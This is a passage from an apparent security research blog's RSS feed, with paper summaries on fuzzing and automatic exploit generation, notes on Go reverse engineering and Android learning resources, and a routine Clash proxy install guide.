&lt;li&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2N5YmVyc2VjLnVzdGMuZWR1LmNuLzIwMjIvMDYwNi9jMjM4NDdhNTU3NDY3L3BhZ2UuaHRt&#34;&gt;http://cybersec.ustc.edu.cn/2022/0606/c23847a557467/page.htm&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL3N0YW1wL3N0YW1wLmpzcD90cD0mYXJudW1iZXI9OTgzMzYxMw==&#34;&gt;https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;amp;arnumber=9833613&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;SELECTFuzz：Efficient-Directed-Fuzzing-with-Selective-Path-Exploration&#34;&gt;&lt;a href=&#34;#SELECTFuzz：Efficient-Directed-Fuzzing-with-Selective-Path-Exploration&#34; class=&#34;headerlink&#34; title=&#34;SELECTFuzz：Efficient Directed Fuzzing with Selective Path Exploration&#34;&gt;&lt;/a&gt;SELECTFuzz：Efficient Directed Fuzzing with Selective Path Exploration&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;能够将目标程序中的相关代码与不相关代码区分开来，这些代码不会触发目标代码中的漏洞。selectfuzz可以选择性地探索相关的程序路径，以实现高效的崩溃再现和漏洞检测。它确定了两种类型的相关代码-路径发散型代码和数据依赖型代码，它们分别捕获与目标代码的控制数据依赖关系。&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWNsYWIuY3NlLmN1aGsuZWR1LmhrL3BhcGVycy9zcDIzX3NlbGVjdGZ1enoucGRm&#34;&gt;https://seclab.cse.cuhk.edu.hk/papers/sp23_selectfuzz.pdf&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;AEM-Facilitating-Cross-Version-Exploitability-Assessment-of-Linux-Kernel-Vulnerabilities&#34;&gt;&lt;a href=&#34;#AEM-Facilitating-Cross-Version-Exploitability-Assessment-of-Linux-Kernel-Vulnerabilities&#34; class=&#34;headerlink&#34; title=&#34;AEM: Facilitating Cross-Version Exploitability Assessment of Linux Kernel Vulnerabilities&#34;&gt;&lt;/a&gt;AEM: Facilitating Cross-Version Exploitability Assessment of Linux Kernel Vulnerabilities&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;内核漏洞迁移&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLndvaGluLm1lL3Bvc3RzL3BhcGVyLWFlbS8=&#34;&gt;https://blog.wohin.me/posts/paper-aem/&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;NDSS&#34;&gt;&lt;a href=&#34;#NDSS&#34; class=&#34;headerlink&#34; title=&#34;NDSS&#34;&gt;&lt;/a&gt;NDSS&lt;/h2&gt;&lt;h3 id=&#34;Towards-Automatic-and-Precise-Heap-Layout-Manipulation-for-General-Purpose-Programs&#34;&gt;&lt;a href=&#34;#Towards-Automatic-and-Precise-Heap-Layout-Manipulation-for-General-Purpose-Programs&#34; class=&#34;headerlink&#34; title=&#34;Towards Automatic and Precise Heap Layout Manipulation for General-Purpose Programs&#34;&gt;&lt;/a&gt;Towards Automatic and Precise Heap Layout Manipulation for General-Purpose Programs&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;一种创新的解决方案，用于自动和精确地操作通用程序的堆布局&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubmRzcy1zeW1wb3NpdW0ub3JnL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIzLzAyL25kc3MyMDIzX3MyMzJfcGFwZXIucGRm&#34;&gt;https://www.ndss-symposium.org/wp-content/uploads/2023/02/ndss2023_s232_paper.pdf&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;CSS&#34;&gt;&lt;a href=&#34;#CSS&#34; class=&#34;headerlink&#34; title=&#34;CSS&#34;&gt;&lt;/a&gt;CSS&lt;/h2&gt;&lt;h3 id=&#34;LibAFL-A-Framework-to-Build-Modular-and-Reusable-Fuzzers&#34;&gt;&lt;a href=&#34;#LibAFL-A-Framework-to-Build-Modular-and-Reusable-Fuzzers&#34; class=&#34;headerlink&#34; title=&#34;LibAFL: A Framework to Build Modular and Reusable Fuzzers&#34;&gt;&lt;/a&gt;LibAFL: A Framework to Build Modular and Reusable Fuzzers&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;集成了多种常用的fuzz方案来进行&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuczMuZXVyZWNvbS5mci9kb2NzL2NjczIyX2Zpb3JhbGRpLnBkZg==&#34;&gt;https://www.s3.eurecom.fr/docs/ccs22_fioraldi.pdf&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;Evocatio-Conjuring-Bug-Capabilities-from-a-Single-PoC&#34;&gt;&lt;a href=&#34;#Evocatio-Conjuring-Bug-Capabilities-from-a-Single-PoC&#34; class=&#34;headerlink&#34; title=&#34;Evocatio: Conjuring Bug Capabilities from a Single PoC&#34;&gt;&lt;/a&gt;Evocatio: Conjuring Bug Capabilities from a Single PoC&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;分析触发漏洞的原因，并自动生成触发漏洞的输入&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbC5hY20ub3JnL2RvaS9wZGYvMTAuMTE0NS8zNTQ4NjA2LjM1NjA1NzU=&#34;&gt;https://dl.acm.org/doi/pdf/10.1145/3548606.3560575&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;Binary-Control-Flow-Trimming&#34;&gt;&lt;a href=&#34;#Binary-Control-Flow-Trimming&#34; class=&#34;headerlink&#34; title=&#34;Binary Control-Flow Trimming&#34;&gt;&lt;/a&gt;Binary Control-Flow Trimming&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;提出了修剪无关代码的方法&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbC5hY20ub3JnL2RvaS9wZGYvMTAuMTE0NS8zMzE5NTM1LjMzNDU2NjU=&#34;&gt;https://dl.acm.org/doi/pdf/10.1145/3319535.3345665&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;Gollum-Modular-and-Greybox-Exploit-Generation-for-Heap-Overflows-in-Interpreters&#34;&gt;&lt;a href=&#34;#Gollum-Modular-and-Greybox-Exploit-Generation-for-Heap-Overflows-in-Interpreters&#34; class=&#34;headerlink&#34; title=&#34;Gollum: Modular and Greybox Exploit Generation for Heap Overflows in Interpreters&#34;&gt;&lt;/a&gt;Gollum: Modular and Greybox Exploit Generation for Heap Overflows in Interpreters&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;自动化堆溢出利用方法&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY3Mub3guYWMudWsvdG9tLm1lbGhhbS9wdWIvSGVlbGFuLTIwMTktR01HLnBkZg==&#34;&gt;https://www.cs.ox.ac.uk/tom.melham/pub/Heelan-2019-GMG.pdf&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;Statically-Discovering-High-Order-Taint-Style-Vulnerabilities-in-OS-Kernels&#34;&gt;&lt;a href=&#34;#Statically-Discovering-High-Order-Taint-Style-Vulnerabilities-in-OS-Kernels&#34; class=&#34;headerlink&#34; title=&#34;Statically Discovering High-Order Taint Style Vulnerabilities in OS Kernels&#34;&gt;&lt;/a&gt;Statically Discovering High-Order Taint Style Vulnerabilities in OS Kernels&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;采用基于摘要的新型高阶污点流构建方法来有效地枚举交叉输入污点流&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbC5hY20ub3JnL2RvaS9wZGYvMTAuMTE0NS8zNDYwMTIwLjM0ODQ3OTg=&#34;&gt;3460120.3484798 (acm.org)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;Learning-to-Explore-Paths-for-Symbolic-Execution&#34;&gt;&lt;a href=&#34;#Learning-to-Explore-Paths-for-Symbolic-Execution&#34; class=&#34;headerlink&#34; title=&#34;Learning to Explore Paths for Symbolic Execution&#34;&gt;&lt;/a&gt;Learning to Explore Paths for Symbolic Execution&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Learch，能够有效地选择有希望的状态进行符号执行，以解决路径爆炸问题&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9maWxlcy5zcmkuaW5mLmV0aHouY2gvd2Vic2l0ZS9wYXBlcnMvY2NzMjEtbGVhcmNoLnBkZg==&#34;&gt;ccs21-learch.pdf (ethz.ch)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;Automated-Bug-Hunting-With-Data-Driven-Symbolic-Root-Cause-Analysis&#34;&gt;&lt;a href=&#34;#Automated-Bug-Hunting-With-Data-Driven-Symbolic-Root-Cause-Analysis&#34; class=&#34;headerlink&#34; title=&#34;Automated Bug Hunting With Data-Driven Symbolic Root Cause Analysis&#34;&gt;&lt;/a&gt;Automated Bug Hunting With Data-Driven Symbolic Root Cause Analysis&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;基于执行轨迹的符号重构状态的漏洞挖掘方法，以更好地检测和分析用户程序及其导入库中的溢出、使用后释放、双重释放和格式化字符串漏洞的根本原因&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbC5hY20ub3JnL2RvaS9wZGYvMTAuMTE0NS8zNDYwMTIwLjM0ODUzNjM=&#34;&gt;3460120.3485363 (acm.org)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Extra&#34;&gt;&lt;a href=&#34;#Extra&#34; class=&#34;headerlink&#34; title=&#34;Extra&#34;&gt;&lt;/a&gt;Extra&lt;/h2&gt;&lt;h3 id=&#34;From-Release-to-Rebirth-Exploiting-Thanos-Objects-in-Linux-Kernel&#34;&gt;&lt;a href=&#34;#From-Release-to-Rebirth-Exploiting-Thanos-Objects-in-Linux-Kernel&#34; class=&#34;headerlink&#34; title=&#34;From Release to Rebirth: Exploiting Thanos Objects in Linux Kernel&#34;&gt;&lt;/a&gt;From Release to Rebirth: Exploiting Thanos Objects in Linux Kernel&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;提出了一种多功能的利用策略，可以将弱利用原语转换为强利用原语&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL3N0YW1wL3N0YW1wLmpzcD90cD0mYXJudW1iZXI9OTk3MDM3Ng==&#34;&gt;https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;amp;arnumber=9970376&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;Tetris-Automatic-UAF-Exploit-Generation-by-Manipulating-Layout-based-on-Reactivated-Paths&#34;&gt;&lt;a href=&#34;#Tetris-Automatic-UAF-Exploit-Generation-by-Manipulating-Layout-based-on-Reactivated-Paths&#34; class=&#34;headerlink&#34; title=&#34;Tetris: Automatic UAF Exploit Generation by Manipulating Layout based on Reactivated Paths&#34;&gt;&lt;/a&gt;Tetris: Automatic UAF Exploit Generation by Manipulating Layout based on Reactivated Paths&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;一个自动生成用户空间 UAF 漏洞利用的系统，能够自动化构建需要的堆布局&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL3N0YW1wL3N0YW1wLmpzcD90cD0mYXJudW1iZXI9MTAwNTMyNDI=&#34;&gt;https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;amp;arnumber=10053242&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;Detecting-Exploit-Primitives-Automatically-for-Heap-Vulnerabilities-on-Binary-Programs&#34;&gt;&lt;a href=&#34;#Detecting-Exploit-Primitives-Automatically-for-Heap-Vulnerabilities-on-Binary-Programs&#34; class=&#34;headerlink&#34; title=&#34;Detecting Exploit Primitives Automatically for Heap Vulnerabilities on Binary Programs&#34;&gt;&lt;/a&gt;Detecting Exploit Primitives Automatically for Heap Vulnerabilities on Binary Programs&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;识别原语的新方法&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL3N0YW1wL3N0YW1wLmpzcD90cD0mYXJudW1iZXI9MTAwNTMyNDI=&#34;&gt;https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;amp;arnumber=10053242&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;- &lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/08/21/aeg-reviwer/</guid>
            <title>AEG_reviwer</title>
            <link>https://alazymechnaic.github.io/2023/08/21/aeg-reviwer/</link>
            <category>paper</category>
            <pubDate>Mon, 21 Aug 2023 14:40:17 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;Detecting-Exploit-Primitives-Automatically-for-Heap-Vulnerabilities-on-Binary-Programs&#34;&gt;&lt;a href=&#34;#Detecting-Exploit-Primitives-Automatically-for-Heap-Vulnerabilities-on-Binary-Programs&#34; class=&#34;headerlink&#34; title=&#34;Detecting Exploit Primitives Automatically for Heap Vulnerabilities on Binary Programs&#34;&gt;&lt;/a&gt;Detecting Exploit Primitives Automatically for Heap Vulnerabilities on Binary Programs&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;文章贡献：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提出了primitive-crucialbehaviors analysis  ，该方法用于在符号执行过程中查找关键执行结构&lt;/li&gt;
&lt;li&gt;利用模糊测试和符号执行设计了一套攻击原语确定方法&lt;/li&gt;
&lt;li&gt;设计DEPA方法用于检测堆溢出相关原语&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;文章提出了一种新的堆溢出漏洞原语的查找方法DEPA，基于以下两种技术：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;primitive-crucial-behavior analysis module &lt;ul&gt;
&lt;li&gt;该模块对目标程序进行符号执行，在执行过程中进行primitive-crucial-behavior analysis（关键原语行为分析）&lt;/li&gt;
&lt;li&gt;primitive-crucial-behavior   ：实现原语的关键结构，此类结构往往与程序语义以及系统API有关&lt;ul&gt;
&lt;li&gt;如何精准识别这些结构？&lt;/li&gt;
&lt;li&gt;如何利用该结构进行漏洞的发现？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;exploit primitive determination method  ：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;事件循环驱动（event loop driven）&lt;/strong&gt;：例如通过交互式进行功能分发的程序，此类程序在一次运行过程中接收一次输入，选择一种处理方式，而后结束。在对此类程序分析的过程中很难使用fuzzing或者符号执行的方法来探索程序的深层状态。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/08/03/android-framework/</guid>
            <title>android_framework</title>
            <link>https://alazymechnaic.github.io/2023/08/03/android-framework/</link>
            <pubDate>Thu, 03 Aug 2023 23:22:19 +0800</pubDate>
            <description><![CDATA[  ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/07/20/go-reverse/</guid>
            <title>go_reverse</title>
            <link>https://alazymechnaic.github.io/2023/07/20/go-reverse/</link>
            <category>go, RE</category>
            <pubDate>Thu, 20 Jul 2023 19:50:06 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;GO-reverse&#34;&gt;&lt;a href=&#34;#GO-reverse&#34; class=&#34;headerlink&#34; title=&#34;GO  reverse&#34;&gt;&lt;/a&gt;GO  reverse&lt;/h2&gt;&lt;hr&gt;
&lt;h3 id=&#34;简介&#34;&gt;&lt;a href=&#34;#简介&#34; class=&#34;headerlink&#34; title=&#34;简介&#34;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;​	GO语言是谷歌开发的强类型静态静态语言，其编译出的汇编代码与 C/ C++语言存在极大的差异。本身Go在编译过程中将所有的库函数和第三方包都进行了静态的打包操作，还打包进去了自身的runtime和（Garbage Collection， 垃圾回收）模块部分代码，导致其编译后的二进制文件体积十分庞大，存在较大的分析难度。&lt;/p&gt;
&lt;h3 id=&#34;Go语言特性&#34;&gt;&lt;a href=&#34;#Go语言特性&#34; class=&#34;headerlink&#34; title=&#34;Go语言特性&#34;&gt;&lt;/a&gt;Go语言特性&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;独有的数据表示方式&lt;/strong&gt;： 例如String类型使用，（start_address，length）二元组进行表示，导致其在进行函数调用时，传入的内容由原本C中的字符串地址变为了两个参数。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;独有的栈管理机制&lt;/strong&gt;：Go语言中的栈使用continue stack机制，每个runtime在初始状态下分配一个较小的区域当做栈，每次运行时如果栈不够用了就再申请一个更大的栈，将旧栈中的内容复制进去。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;全静态链接&lt;/strong&gt;：程序中并不按照函数名对库函数进行动态使用，而是进行全静态链接，在没有调试信息和符号表的情况下调试难度很大&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;独有的函数调用机制&lt;/strong&gt;：Go语言函数中的callee的栈空间由caller来进行管理，caller在进入callee之前预先将栈中把参数留出，同时还要给返回值留出栈空间&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL21lbWJlci5odG1sP21lbWJlcklkPTEyMjA3OQ==&#34;&gt;https://www.anquanke.com/member.html?memberId=122079&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TWpNNU5UYzJNRFl4TXc9PSZtaWQ9MjQ1ODM4NzExNiZpZHg9MSZzbj1jNjY4ZGFlYTMwYmM5ZGNlOGQ3OWQzMTZlOTM5OTNlNCZjaGtzbT1iMThmMzIyNjg2ZjhiYjMwZTgxYjc0NjQ0NmYwOGRjZDM4MWE1ODhiNWMwYzZiODQyMDA3Y2M4MjJhODc1YmQ1ZWQxNGMyZDc0ZDZhJnNjZW5lPTI3&#34;&gt;https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;amp;mid=2458387116&amp;amp;idx=1&amp;amp;sn=c668daea30bc9dce8d79d316e93993e4&amp;amp;chksm=b18f322686f8bb30e81b746446f08dcd381a588b5c0c6b842007cc822a875bd5ed14c2d74d6a&amp;amp;scene=27&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2xlYW5vdGUuY29tL2Jsb2cvcG9zdC81YzY0YmIyYmFiNjQ0MTUxNjcwMDBmNDg=&#34;&gt;http://leanote.com/blog/post/5c64bb2bab64415167000f48&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/07/20/android-basic/</guid>
            <title>Android_Basic</title>
            <link>https://alazymechnaic.github.io/2023/07/20/android-basic/</link>
            <pubDate>Thu, 20 Jul 2023 19:07:47 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;本文用于介绍安卓基础架构以及安卓安全的学习方法及路线&#34;&gt;&lt;a href=&#34;#本文用于介绍安卓基础架构以及安卓安全的学习方法及路线&#34; class=&#34;headerlink&#34; title=&#34;本文用于介绍安卓基础架构以及安卓安全的学习方法及路线&#34;&gt;&lt;/a&gt;本文用于介绍安卓基础架构以及安卓安全的学习方法及路线&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;采用课程与笔记相结合的方式&lt;/li&gt;
&lt;li&gt;移动安全课程&lt;ul&gt;
&lt;li&gt;看完这些课程就行，每天一节，方便以后找工作&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMW5iNDExZjc3Ny8/c3BtX2lkX2Zyb209MzMzLjMzNy5zZWFyY2gtY2FyZC5hbGwuY2xpY2s=&#34;&gt;https://www.bilibili.com/video/BV1nb411f777/?spm_id_from=333.337.search-card.all.click&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMXQzNDExdTdjcC8/c3BtX2lkX2Zyb209MzMzLjMzNy5zZWFyY2gtY2FyZC5hbGwuY2xpY2s=&#34;&gt;https://www.bilibili.com/video/BV1t3411u7cp/?spm_id_from=333.337.search-card.all.click&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/07/14/clash-build/</guid>
            <title>clash_build</title>
            <link>https://alazymechnaic.github.io/2023/07/14/clash-build/</link>
            <category>clash</category>
            <pubDate>Fri, 14 Jul 2023 10:14:42 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;Clash-Install&#34;&gt;&lt;a href=&#34;#Clash-Install&#34; class=&#34;headerlink&#34; title=&#34;Clash Install&#34;&gt;&lt;/a&gt;Clash Install&lt;/h2&gt;&lt;hr&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 下载clash&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;wget&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-O&lt;/span&gt; clash.gz https://github.com/Dreamacro/clash/releases/download/v1.13.0/clash-linux-amd64-v1.13.0.gz
&lt;span class=&#34;token comment&#34;&gt;# 解压&lt;/span&gt;
gunzip &lt;span class=&#34;token parameter variable&#34;&gt;-d&lt;/span&gt; clash.gz
&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;chmod&lt;/span&gt; +x clash
&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mkdir&lt;/span&gt; /opt/clash
&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mv&lt;/span&gt; clash /opt/clash
&lt;span class=&#34;token builtin class-name&#34;&gt;cd&lt;/span&gt; /opt/clash
&lt;span class=&#34;token comment&#34;&gt;# 下载配置文件&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;wget&lt;/span&gt; https://github.com/Dreamacro/maxmind-geoip/releases/download/20230612/Country.mmdb
&lt;span class=&#34;token comment&#34;&gt;# config.yaml中存放的是&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 这里的配置文件需要clash的订阅文件，可以在客户端里找到&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;mv&lt;/span&gt; /home/harry/1688348600374.yml ./config.yaml 
./clash &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; config.yaml
&lt;span class=&#34;token comment&#34;&gt;# 保证clash后台运行&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;cp&lt;/span&gt; Country.mmdb config.yaml ~/.config/clash
&lt;span class=&#34;token function&#34;&gt;nohup&lt;/span&gt; ./clash &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; config.yaml &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;ps&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-ef&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; clash

&lt;span class=&#34;token comment&#34;&gt;# 设置代理&lt;/span&gt;
&lt;span class=&#34;token builtin class-name&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;http_proxy&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;http://127.0.0.1:7890 
&lt;span class=&#34;token builtin class-name&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;https_proxy&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;http://127.0.0.1:7890
&lt;span class=&#34;token comment&#34;&gt;# 里面编辑上述内容&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;vim&lt;/span&gt; ~/.bashrc
&lt;span class=&#34;token builtin class-name&#34;&gt;source&lt;/span&gt; ~/.bashrc
&lt;span class=&#34;token comment&#34;&gt;# 如果想取消就是用下面命令&lt;/span&gt;
&lt;span class=&#34;token builtin class-name&#34;&gt;unset&lt;/span&gt; http_proxy
&lt;span class=&#34;token builtin class-name&#34;&gt;unset&lt;/span&gt; https_proxy
 &lt;span class=&#34;token builtin class-name&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;&lt;span class=&#34;token environment constant&#34;&gt;PATH&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$(&lt;/span&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;)&lt;/span&gt;&lt;/span&gt;/depot_tools:&lt;span class=&#34;token environment constant&#34;&gt;$PATH&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;BUG&#34;&gt;&lt;a href=&#34;#BUG&#34; class=&#34;headerlink&#34; title=&#34;BUG&#34;&gt;&lt;/a&gt;BUG&lt;/h3&gt;&lt;h4 id=&#34;重启后没有图形化界面&#34;&gt;&lt;a href=&#34;#重启后没有图形化界面&#34; class=&#34;headerlink&#34; title=&#34;重启后没有图形化界面&#34;&gt;&lt;/a&gt;重启后没有图形化界面&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 重新安装图形化界面&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;apt-get&lt;/span&gt; update
&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;apt-get&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;--reinstall&lt;/span&gt; ubuntu-desktop
&lt;span class=&#34;token comment&#34;&gt;# 一般执行完上面一条就进去了&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;apt-get&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt; unity
